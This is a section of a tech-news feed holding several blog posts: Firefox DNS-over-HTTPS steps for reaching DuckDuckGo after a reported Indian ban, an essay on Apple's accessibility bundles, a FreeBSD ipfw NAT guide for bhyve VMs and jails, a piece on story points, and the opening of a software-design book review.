<p>Google not only logs your search history from its search engine but also tracks your activities on various websites you visit by paying them to run their scripts on the site’s webpages.</p>



<h3><span>Don’t believe it?</span></h3>



<hr>
<p>I know it might sound like a conspiracy theory but you’d be amazed to know how easy it is to verify these claims. Simply install a plugin like uBlock Origin (<a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin">For Firefox</a> or <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en-US">For Chrome</a>) that lets you see the domains that a website is trying to connect to from your computer and you’ll find that Google’s and Facebook’s trackers are all over the internet.</p>
<p>When you visit a website, the website’s content is downloaded to your device including HTML page, CSS styling and Java Scripts. The websites paid by Google and Facebook send you some additional Java Scripts along with their contents that connect to Google’s and Facebook’s servers and send your information to them.</p>
<p>This is also the reason why you see ads similar to your search history all over the internet, specially on websites like YouTube, Facebook, Google, Amazon, etc.</p>



<figure><img data-attachment-id="1099" data-permalink="https://crackerscreed.org/indian-government-bans-duckduckgo-how-to-get-it-back/screenshot-278-1/" data-orig-file="https://i2.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-278-1.png?fit=1594%2C666&amp;ssl=1" data-orig-size="1594,666" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot-278-1" data-image-description="" data-medium-file="https://i2.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-278-1.png?fit=300%2C125&amp;ssl=1" data-large-file="https://i2.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-278-1.png?fit=756%2C316&amp;ssl=1" src="https://i2.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-278-1.png?w=756&amp;ssl=1" alt="" srcset="https://i2.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-278-1.png?w=1594&amp;ssl=1 1594w, https://i2.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-278-1.png?resize=300%2C125&amp;ssl=1 300w, https://i2.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-278-1.png?resize=1024%2C428&amp;ssl=1 1024w, https://i2.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-278-1.png?resize=768%2C321&amp;ssl=1 768w, https://i2.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-278-1.png?resize=1536%2C642&amp;ssl=1 1536w, https://i2.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-278-1.png?resize=1250%2C522&amp;ssl=1 1250w, https://i2.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-278-1.png?resize=200%2C84&amp;ssl=1 200w" sizes="(max-width: 756px) 100vw, 756px" data-recalc-dims="1"><figcaption>Screenshot displays Google’s Javascripts running on Standard Chartered’s Website </figcaption></figure>



<p>The screenshot above is marked with a box that displays that when I visit Standard Chartered’s website, a total of 5 domains get information about my presence on that website. Of these 5 domains, the requests to sc.com and www.sc.com were partially blocked (Red Arrow marked 1), gioip-js.com and googletagmanager.com were completely blocked (Red Arrow Marked 2) and maps.googleapis.com were not at all blocked (Red Arrow Marked 3) by uBlock Origin’s default set of filters. If you’d look a little to the right of that red box, you’d notice that despite 7 requests being blocked in total (13% of all requests on that page), the website was still completely functional and that it did not break.</p>



<h3><span>What’s in it for the government?</span></h3>



<hr>
<p>Frankly, to answer this question is difficult. Sometimes, governments ask these companies to share the data to track their citizens for various reasons. Other times, the governments ask companies like Google to help identify the protestors by disclosing their mobile phone’s GPS location at the time of protests and as a <em>quid pro quo </em>they kill their competition by passing Laws to ban sites like DuckDuckGo. We can never know these answers for sure as these deals are made behind closed doors.</p>



<h3><span>So, what do I do about DuckDuckGo?</span></h3>



<hr>
<p>Well, fortunately the solution to this problem is extremely simple. You can go to the Menu section of Firefox, select Options, go to the “General” settings tab, scroll all the way to the bottom and click the “Settings” button under “Network Settings”.</p>



<figure><img data-attachment-id="1101" data-permalink="https://crackerscreed.org/indian-government-bans-duckduckgo-how-to-get-it-back/screenshot-281/" data-orig-file="https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-281.png?fit=1600%2C792&amp;ssl=1" data-orig-size="1600,792" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot-281" data-image-description="" data-medium-file="https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-281.png?fit=300%2C149&amp;ssl=1" data-large-file="https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-281.png?fit=756%2C374&amp;ssl=1" src="https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-281.png?w=756&amp;ssl=1" alt="" srcset="https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-281.png?w=1600&amp;ssl=1 1600w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-281.png?resize=300%2C149&amp;ssl=1 300w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-281.png?resize=1024%2C507&amp;ssl=1 1024w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-281.png?resize=768%2C380&amp;ssl=1 768w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-281.png?resize=1536%2C760&amp;ssl=1 1536w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-281.png?resize=1250%2C619&amp;ssl=1 1250w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-281.png?resize=200%2C99&amp;ssl=1 200w" sizes="(max-width: 756px) 100vw, 756px" data-recalc-dims="1"><figcaption>First 4 Steps in Firefox</figcaption></figure>



<p>On the menu that pops up, scroll to the bottom and select “Enable DNS Over HTTPS” and from the dropdown, you can select “NextDNS” as your “Use Provider”.</p>



<figure><img data-attachment-id="1102" data-permalink="https://crackerscreed.org/indian-government-bans-duckduckgo-how-to-get-it-back/screenshot-282/" data-orig-file="https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-282.png?fit=1600%2C761&amp;ssl=1" data-orig-size="1600,761" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot-282" data-image-description="" data-medium-file="https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-282.png?fit=300%2C143&amp;ssl=1" data-large-file="https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-282.png?fit=756%2C360&amp;ssl=1" src="https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-282.png?w=756&amp;ssl=1" alt="" srcset="https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-282.png?w=1600&amp;ssl=1 1600w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-282.png?resize=300%2C143&amp;ssl=1 300w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-282.png?resize=1024%2C487&amp;ssl=1 1024w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-282.png?resize=768%2C365&amp;ssl=1 768w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-282.png?resize=1536%2C731&amp;ssl=1 1536w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-282.png?resize=1250%2C595&amp;ssl=1 1250w, https://i1.wp.com/crackerscreed.org/wp-content/uploads/2020/07/Screenshot-282.png?resize=200%2C95&amp;ssl=1 200w" sizes="(max-width: 756px) 100vw, 756px" data-recalc-dims="1"><figcaption>The Final Destination!</figcaption></figure>



<p>Besides the two options provided by Firefox, you can also find a list of other HTTPS-enabled privacy-oriented DNS services on <a href="https://www.privacytools.io/providers/dns/">PrivacyTools.io – DNS</a> page.</p>



<h3><span>How Does This Solution Work?</span></h3>



<hr>
<p>To understand how this solution work, we first need to understand how does the DNS work and <a href="https://crackerscreed.org/understanding-ssl-certificates/">how does SSL certificate work</a>. Once you understand that, you’d notice the if your DNS queries are sent over HTTPS, they can only be read by the DNS server and not by your ISP’s firewall. Without reading the your DNS query, they cannot tamper or block its intended response and hence cannot block you from getting its IP address.</p>



<h3><span>Is It A Fool-Proof Solution?</span></h3>



<hr>
<p>The unfortunate answer is No! There are other ways that a government can block a website like IP address based filtering, content based filtering, etc. And even if you bypass these filters and access DuckDuckGo, by no mean you become anonymous over the internet but, switching to an actively-maintained open-sourced browser such as Firefox, installing malware/tracking blocker plugin like uBlock Origin and switching to a privacy-oriented search engine can dramatically reduce your digital footprint. It could be your first step towards a long journey of internet anonymity and digital privacy!</p>

							</div><!-- .entry-content -->

			<!-- .entry-footer -->

			
<!-- #comments -->

		</div>

		<!-- .sidebar -->

	</article></div>]]>
            </description>
            <link>https://crackerscreed.org/indian-government-bans-duckduckgo-how-to-get-it-back/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23710613</guid>
            <pubDate>Thu, 02 Jul 2020 06:42:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Accessibility Engineering and Low End Disruption]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23710559">thread link</a>) | @ingve
<br/>
July 1, 2020 | http://www.takingnotes.co/blog/2020/07/01/accessibility-engineering/ | <a href="https://web.archive.org/web/*/http://www.takingnotes.co/blog/2020/07/01/accessibility-engineering/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>apple doesn’t succeed at making their platforms accessible because they care more, they don’t succeed because they are somehow better at programming</h3>

<p>a capable, thoughtful manager, who is correctly assessing risk vs reward, both qualitatively and quantitatively, who is doing their job well, using all of the experience and skill that brought them to where they are, can, and likely will, decide to ship an app that could be accessible, but is not.</p>

<p>this is not a function of callousness (although they may also be quite callous).</p>

<p>this is not a function of engineering aptitude (plenty of our leading lights have let access fall to the wayside<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> by making solid engineering choices that are completely defensible).</p>

<p>the apple accessibility teams are made up of disciplined, brilliant engineers. they all work incredibly hard on a problem with unimaginable scale. but their brilliance and discipline and hard work, while necessary, are not sufficient.</p>

<p>what matters here, what sets apple apart, is that they figured out how to go last and contain the risk enough to avoid a revolt from other teams or executive leadership. it costs them a lot to do so, has significant, measurable downsides, and requires a significant rethink of what it means to build good software.</p>

<h3>bundles</h3>

<p>some of the code that powers accessibility on apple platforms is just disgusting to look at and to work on.</p>

<p>most of the code that makes apple software accessible lives in what’s called an accessibility bundle. without diving into the minutia of the thing, bundles are a way to load something akin to a plugin into a cocoa app at runtime if an assistive technology is activated. it involves manipulating the app or framework class hierarchy and using objective-c dynamism to read app state and build up a usable accessibility hierarchy. insert a super class here, read an instance variable there, swizzle in a method and store the state for it in associated objects.<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup></p>

<p>bundles are not a good way to build software by any common measure. they don’t make you efficient, or your code correct. the performance can get bad. they’re hard to maintain and involve constant patching to keep them alive. huge chunks of bundle code are thrown away and rewritten multiple times during every major os release.</p>

<p>i found the initial adjustment to working on this code sometimes viscerally upsetting. “i can’t do that!!”, “clearly i should be protecting against…”, “if i do it that way it’ll break when they…”, etc.</p>

<p>the thing is, critically, if a user never activates an assistive technology like voiceover they wouldn’t know bundles even exist. many of the managers at apple don’t know much or care much about accessibility. some of them are borderline hostile to it. the bundles make it possible for the accessibility team to allocate their own resources and set their own priorities with only very limited coordination and fallout contained to people who would benefit most from the upside. they allow the accessibility team to fix the bugs they find, when they find them, with pretty limited opportunities for a manager who’s next promotion is on the line to get cold feet and pull resources or block fixes.</p>

<p>in the model of low end disruption, we can see bundles as a low end entrant, with a product that seems worse, but that solves an important problem in a way that the mature products, by their nature, can’t realistically address.</p>

<p>if the job to be done is “produce easy to understand, correct, maintainable code that engineers who care about those things will enjoy working on” then bundles aren’t even in the competition.</p>

<p>if the job is “manage your team resources responsibly, keep your bug count low, ship your features on time” then bundles aren’t the tool you reach for. why would you load a squirrelly plugin into your own app on purpose?</p>

<p>the chaotic morass of runtime hacks and macros for everything and nearly exclusive dependence on runtime validation<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup> make them not just not good, but almost aggressively bad. but if the job they are hired to do is make apps that aren’t accessible, they’re incredible. unparalleled. entirely without peer.</p>

<p>almost all the things a good engineer would do to make bundles less gross would make them worse in unacceptable ways. almost anything a high end product might do to accommodate the kind of autonomy bundles demand would make them unacceptable to their current clients.<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup></p>

<p>apple has a team whose only job is to make things accessible and they have infrastructure that lets that team mostly avoid people who have a different job saying no to them. put those together and you have the most successful accessibility software team (imho) on planet earth.</p>

<h3>the gross stuff isn’t desirable, but is maybe necessary</h3>

<p>anyone who is steeped in universal design that has made it this far has maybe broken out in hives? please just stick with me, it’ll all come out in the wash.</p>

<ul>
<li>well designed apps that take accessibility into consideration from the beginning are better for everyone.</li>
<li>accessible ramps for getting into buildings are better than those terrible lifts they bolt into the sides of stairs in public buildings.</li>
<li>we all benefit from features in society that originate as accessibility affordances, like curb cuts for wheelchairs, that everyone with a stroller can now take for granted.</li>
</ul>


<p>without question these statements are true.</p>

<p>i don’t worry too much about saying things that might make people think i’m a bad engineer or have bad ideas about building software. i do care a lot about not giving people the idea that we should all knock out our accessibility code real quick and sloppy at the end as an afterthought.</p>

<p>my thesis here is that where the effect of failing is very much acute, most of us do not adjust our approach accordingly. likely because we regard assistive technology users as one of many available audiences we may or may not wish to court.</p>

<p>if we ship an app that’s inaccessible, hey we’ll get around to it, we’ve got a roadmap, hasn’t bubbled up yet, software takes time. there are so many bugs in our support tracker and “doesn’t work for blind people” is just a tiny blip.</p>

<p>of course we should be methodical and plan ahead and build our software in a way that is both accessible and maintainable. we should seek to avoid compromising, but should the need to compromise emerge, the balance should unquestionably be tilted towards gross and unmaintainable code where that is the cost of accessibility. if you could fix that missing label but eww i’d have to wire up a very clumsy chain of delegates or fire a notification that clearly violates layering, without question, you should do it.<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup></p>

<p>we should be willing to find a blend of cultural and political and technical workarounds in our organizations that acknowledge that code can’t be allowed to go out the door that isn’t accessible and that a lot of our ideas about technical excellence and what a good engineering manager does wildly miscalculate the cost of our decisions to “do it right”.</p>


</div></div>]]>
            </description>
            <link>http://www.takingnotes.co/blog/2020/07/01/accessibility-engineering/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23710559</guid>
            <pubDate>Thu, 02 Jul 2020 06:27:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Adventurist.me: Simple ipfw NAT for bhyve virtual machines and vnet jails]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23710548">thread link</a>) | @rodrigo975
<br/>
July 1, 2020 | https://adventurist.me/posts/00304 | <a href="https://web.archive.org/web/*/https://adventurist.me/posts/00304">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
		<p>Most of the time, I want to do some throw away networking temporally to play
with something or to try something out. I really don't like changing all the
config on a machine just to try something. The FreeBSD documentation leans the
other way first showing you what to edit in rc.conf before maybe mentioning
that actual commands to run. </p>
<p>The ipfw documentation has a different problem. The example in the handbook and
online are both very verbose and very complicated. Because ipfw is normally
configured with a shell script the authors go absolutely wild with all the
features they can.</p>
<p>I had a hard time figuring out ipfw in-kernel NAT from these guides. Instead
here I present the simplest set of commands I could find to set up a NAT and a
little explanation to help you debug when it doesn't work.</p>
<p>This is based on a great email from <a href="https://lists.freebsd.org/pipermail/freebsd-virtualization/2014-October/002998.html">Allan Jude</a> on the
freebsd-virtualization list from 2014 that laid out the basics of this setup. </p>
<h2 id="set-up-overview">Set up Overview</h2>
<p>For testing I want to run virtual machines and vnet jails on my laptop and give
them have access to the internet. I want a throw away NAT setup that is ready
to go quickly.</p>
<p>My laptop connects to my home network (and eventually the internet) over wifi.
The wifi network offers me an address in the 192.168.1.0/24 subnet. On my
laptop I want to have multiple guests. To do this we are going to use ipfw NAT
and a bridge interface. It will look something like this:</p>
<pre><code>         TO INTERNET
          ^
          |
          |
          v
          +-------+  192.168.1.x
+-------------| wlan0 |---------------+
|             +-------+               |
|                 ^                   |
|                 |                   |
|              ipfw nat               |
|                 |                   |
|                 V                   |
|            +---------+              |
| 10.0.4.1   | bridge0 |              |
|            +----+----+              |
|                 ^                   |
|                 | 10.0.4.0/24       |
|      ___________+_______________    |
|      |       |        |        |    |
|      v       v        v        v    |
|  +---+--+ +--+---+ +--+---+ +--+---+|
|  | jail | |  vm  | | jail | | ...  ||
|  +------+ +------+ +------+ +------+|
+-------------- laptop ---------------+
</code></pre><p>The interfaces in the jails (the b half of the epair) and the virtual machines
(the vtnet in the V) won't be visible to ipfw, but will exist in their own
world. To work around this we will use a bridge with the epairs and tap
interfaces.</p>
<h2 id="setting-up-ipfw-nat">Setting up ipfw NAT</h2>
<p>We need to load the kernel modules for ipfw and the ipfw in kernel NAT. ipfw
has the frustrating default (and annoyingly different to ipf and pf) of to
dening all traffic. This default has the great property of locking you out of a
machine you are setting up remotely.</p>
<p>This is control by a sysctl that cannot be changed at run time, but we can
change the default behaviour with kenv before we load the module:</p>
<pre><code># kenv net.inet.ip.fw.default_to_accept=1
</code></pre><p>Now we can safely load ipfw and the in-kernel NAT. </p>
<pre><code># kldload ipfw ipfw_nat
</code></pre><p>ipfw should load enabled, if you are having trouble later on double check that
the firewall is actually enabled.</p>
<pre><code># sysctl net.inet.ip.fw.enable
net.inet.ip.fw.enable: 1
</code></pre><p>When we do NAT we are acting as a gateway between the traffic on the NATd
interface and the real interface. For any packets to be passed we need to
enable forwarding.</p>
<pre><code># sysctl net.inet.ip.forwarding=1
# sysctl net.inet6.ip6.forwarding=1
</code></pre><h2 id="ipfw-rule-set">ipfw rule set</h2>
<p>We need to create an IPFW NAT instance configured with the interface we want to
NAT (wlan0 in this case) and configure rules to pass all traffic from the
bridge through the NAT.</p>
<pre><code># ipfw nat 1 config if wlan0
# ipfw add 101 nat 1 ip from 10.0.4.0/24 to any out via wlan0
# ipfw add 103 nat 1 ip from any to any in via wlan0
</code></pre><p>I like to leave a gap between rules like this so I can insert an ipfw log
command for the eventual case that nothing makes sense and everything is
broken.</p>
<h2 id="set-up-interfaces">set up interfaces</h2>
<p>A bridge is the center of our guest network, we will give it the default root
address that all of our guests will speak to.</p>
<pre><code># ifconfig bridge create
bridge0
# ifconfig bridge0 inet 10.0.4.1/24 up
</code></pre><p>Our jail will use an epair interface to speak to the outside world. They come
as an a and a b part, ifconfig only tells us about the a part when it clones
the interface. When we give a vnet jail an interface it is no longer visible to
the host system. An epair gives us two interfaces that act like a virtual
ethernet cable, we stick one end into the jail and the other is connected to
the bridge.</p>
<pre><code># ifconfig epair create
epair0a
</code></pre><p>Our virtual machine will use a tap interface to access the world. The tap
interface needs to be brought up. There is a helpful sysctl that is off by
default which will trigger the interface to be brought up when it is first
opened. I like to set this to one, otherwise I find myself debugging networking
inside the VM alot with little success.</p>
<pre><code># ifconfig tap create
tap0
# sysctl net.link.tap.up_on_open=1
</code></pre><p>With all the interfaces set up we need to add them to our bridge.</p>
<pre><code># ifconfig bridge0 addm epair0a addm tap0
</code></pre><h2 id="create-jail">Create jail</h2>
<p>Never spoken about is the bsdinstall jail command. It takes a directory and
installs a jail into it. This command will ask you some questions, it would be
cool if it didn't, that would make automating jail creation in scripts much
easier for me.</p>
<pre><code># mkdir testjail
# bsdinstall jail testjail
</code></pre><p>We make our jail persist so it will stick around as we experiment. The
following command creates the jail on the host:</p>
<pre><code># jail -c name=testjail persist vnet path=testjail vnet.interface=epair0b 
</code></pre><p>Now we can jexec into the jail and configure the epair. When you bring one end
of an epair up, the other end comes up, when it goes down the other end goes
down. We just need to configure an address and a default route in our jail.</p>
<pre><code># jexec testjail sh
[testjail] # ifconfig epair0b inet 10.0.4.4/24 up
[testjail] # route add default 10.0.4.1
[testjail] # ping -c 1 10.0.4.1
[testjail] # ping -c 1 192.168.1.1
[testjail] # ping -c 1 8.8.8.8
</code></pre><p>With this setup the jail can speak to our bridge, the local network and the
wider Internet.</p>
<h2 id="create-and-config-a-vm">Create and config a VM</h2>
<p>The FreeBSD offers prebuilt virtual machine images, The latest current one is
available from a url like this:</p>
<pre><code># fetch ftp://ftp.freebsd.org/pub/FreeBSD/snapshots/VM-IMAGES/13.0-CURRENT/amd64/Latest/FreeBSD-13.0-CURRENT-amd64.raw.xz
</code></pre><p>It would be cool if there was a latest symlink that gave you a new head VM from
one static place. The image comes xz compressed, we need to unpack it and I
like to move it to a consistent place:</p>
<pre><code># xz -d FreeBSD-13.0-CURRENT-amd64.raw.xz
# mv FreeBSD-13.0-CURRENT-amd64.raw /vms/freebsd-current
</code></pre><p>bhyve requires we load the vmm kernel module, with that we can use the
excellent vmrun.sh script to launch our vm.</p>
<pre><code># kldload vmm
# sh /usr/share/examples/bhyve/vmrun.sh -c 4 -m 1024 -t tap0 -d /vms/freebsd-current freebsd-current
</code></pre><p>Once that comes up you can log in and do some manual config.</p>
<pre><code>[vm] # ifconfig vtnet0 inet 10.0.4.5/24 up
[vm] # route add default 10.0.4.1
[vm] # ping 8.8.8.8
</code></pre><p>For DNS in both the jail and the virtual machines I have to manually set up the
name server local from my network.</p>
<p>/etc/resolv.conf</p>
<pre><code>search lan
nameserver 192.168.1.1
</code></pre><p>This won't be valid as I move to other networks, but I am sure I will remember
after only a little confusion and debugging.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That is all it takes. The NAT configuration is 3 firewall rules and enabling
forwarding. None of this is persistent and that isn't great practice for a
production environment, but it you just want to experiment with ipfw and NAT,
or spin up a VM for today knowing how to do this in a non-persistent way is
really helpful.</p>

		
	<section>
	
</section></section></div>]]>
            </description>
            <link>https://adventurist.me/posts/00304</link>
            <guid isPermaLink="false">hacker-news-small-sites-23710548</guid>
            <pubDate>Thu, 02 Jul 2020 06:25:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting your head around story points]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23710537">thread link</a>) | @thip
<br/>
July 1, 2020 | https://davidcapper.dev/posts/getting-your-head-around-story-points | <a href="https://web.archive.org/web/*/https://davidcapper.dev/posts/getting-your-head-around-story-points">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><img src="https://davidcapper.dev/assets/aron-visuals-BXOXnQ26B7o-unsplash.jpg" alt="hourglass">
<em>Photo by <a href="https://unsplash.com/@aronvisuals">Aron Visuals</a> on <a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></em></p>

<p>Human beings are not very good at seeing into the future. Unless you have a crystal ball or know how to read tea leaves, trying to predict when an event will happen with any degree of accuracy is very difficult. Unfortunately, as software developers, we are regularly asked to do this. Stakeholders usually want to know when they can expect the completion of features. It can make them nervous if we tell them that we don’t know for sure, or give a timeframe that sounds worryingly large to them to account for our uncertainty.</p>

<p>Story points attempt to solve this by sidestepping time-based estimates, and focusing instead upon estimating complexity - on the basis that we are better at judging how complicated a piece of work is than how long it will take to complete.  Estimating complexity allows us to abstract away things that we can’t reasonably predict (and often throw off our predictions) such as illness and distractions, and focus on the things that we can - like whether one task is going to be bigger than another.</p>

<p>Once we have a way to quantify complexity, it is possible to begin to measure how much of it can be tackled over time - this is known as velocity. Measuring a team’s velocity allows us to build forecasts of how much work they are likely to be able to complete in the future. Note the word <em>likely</em> in that last sentence. Story points are not a silver bullet that will let you make perfect predictions about when a task will be finished - but in my experience, they are a significant step up from trying to estimate time directly.</p>

<p>They help you shift from hand-waving and guessing, to evidence-based reasoning about a teams capacity. Over time I’ve found that the accuracy of story point-based predictions tend to improve as teams gain practice and experience, and as the error in velocity averages away as more data gets added to the calculation.</p>

<p>Story points can be a contentious topic amongst software professionals; a lot have had bad experiences with them, and don’t see how they can ever help on a project. While I don’t think story points will be a good fit for <em>all</em> projects, I do believe that they can be useful on <em>a lot</em> of projects - especially when teams are inexperienced and haven’t had a chance to build up some discipline.</p>

<p>I regularly hear two objections to story points that, in my opinion, betray underlying flaws in peoples thinking rather than a problem with the technique itself:</p>

<p>Firstly: that the complexity of a task is different depending on whether you have more or less experience, often stated as ‘my points are different from your points’. Secondly: that there is ultimately no real difference between complexity and time - ‘five points is about a day, this task will take about a day, so I vote five points’.</p>

<p>The first objection is problematic because you should be estimating for the team, not individuals. If a task is going to be harder for a particular person to complete, then the team should be working with them to help. If you expect someone to struggle to complete work by themselves with no assistance when it would benefit them, then you have more significant problems on your team than estimation. It would be best if you focused on fostering collaboration and knowledge sharing before worrying about anything else.</p>

<p>The second objection is harder to help people move past.  The cognitive leap from time-based estimation, to complexity-based estimation, is quite a large one. The easiest way that I have found to help people get into the right frame of mind is by agreeing on a story to use as a reference at the beginning of estimation sessions. The question then becomes ‘how much larger is the story we are currently estimating than our reference story?’ When they don’t have a lot of experience with relative complexity, people often find ranking stories, and then fitting points to them later much more straightforward than coming up with points on the spot (as you would with planning poker).</p>

<p>With a bit of time and practice, most teams can build up an implicit understanding of how story points relate to the complexity of individual pieces of work in their backlog.  As a team becomes more practised, a satisfying moment eventually occurs: everyone’s estimates begin to converge. You know that your team is getting the hang of things when everyone is consistently voting for the same number of story points on each piece of work that comes up; and when any significant variation that occurs is the result of someone knowing something that the others haven’t considered.</p>

<p>Whether or not you use story points on your project, I think there are some ideas we can learn from them that are universally applicable. Almost all projects benefit when we can quantify changes to them over time. Reflecting upon, and learning from our experiences is a crucial part of agile development, and doing this with data can give us confidence in our conclusions, and justification for our predictions.</p>


  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://davidcapper.dev/posts/getting-your-head-around-story-points</link>
            <guid isPermaLink="false">hacker-news-small-sites-23710537</guid>
            <pubDate>Thu, 02 Jul 2020 06:22:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Book Review: A Philosophy of Software Design]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23710374">thread link</a>) | @signa11
<br/>
July 1, 2020 | http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html | <a href="https://web.archive.org/web/*/http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>

<p>I’m trying to read all the good writing about software design. This is very easy because not very much has been written: it turns out that it’s much easier to write an article about how to write a Tetris AI as a containerized Kotlin microservice than it is to shed insight on how to write good code. And so, when I heard about John Ousterhout’s new book “A Philosophy of Software Design,” I ordered my copy immediately.</p>

<center><img height="200" src="https://images-na.ssl-images-amazon.com/images/I/61iOSX4WNiL._SX404_BO1,204,203,200_.jpg" width="161"></center>

<p>I remember John Ousterhout from Stanford’s grad student visit day as the tall guy who introduced himself with a self-deprecating joke and invited all the Ph. D. admits over to dinner at his house. I know him also as the father of <a href="http://kayousterhout.org/">Kay Ousterhout</a>, whom I recently met as a fellow speaker at Strange Loop, and Amy Ousterhout, whom together are the first pair of sisters to both win the prestigious Hertz Fellowship.</p>

<p>At 170 pages, “A Philosophy of Software Design” (henceforth: PoSD) is a humble book. John’s background is in systems rather than in software engineering or programming languages, and he never claims special expertise. But his practitioner cred is immense. I enjoy tearing apart open-source projects and turning them into case studies of what not to do, so much that my students have requested I write a case study about good code for once. RAMCloud, Ousterhout’s distributed in-memory storage system, is now on my shortlist: from a 5-minute glance, it’s among the cleanest and best-documented code I’ve seen. And, given that he’s a busy professor managing a large lab, he’s written a surprising amount of it himself. He’s had plenty of impact too: he’s the creator of the Tcl language and its Tk framework, which I learned in 2005 as The Way to Write GUIs(™).</p>

